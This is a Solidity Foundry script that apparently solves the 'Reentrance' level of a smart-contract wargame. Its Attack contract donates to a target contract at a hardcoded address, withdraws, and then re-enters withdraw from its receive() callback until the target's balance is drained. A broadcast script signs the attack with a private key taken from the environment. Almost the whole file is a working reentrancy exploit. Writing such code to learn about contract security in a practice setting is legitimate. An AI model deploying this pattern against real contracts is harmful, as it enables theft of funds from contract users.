// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;


import "../src/Level10.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Attack{

    Reentrance public r_instance =Reentrance(0x1e5f76396a5b433c9c462c919dAf64Eed6bD4926);

    function exploit() external payable{

        r_instance.donate{value: 0.001 ether}(address(this));
        r_instance.withdraw(0.001 ether);
    }
    receive() external payable{
        if(address(r_instance).balance >= 0.001 ether){
             r_instance.withdraw(0.001 ether);
        }
    }
}

contract Level10Sol is Script{
    function run() external {
            vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
            new Attack().exploit{value: 0.001 ether}();
            vm.stopBroadcast();
    }
}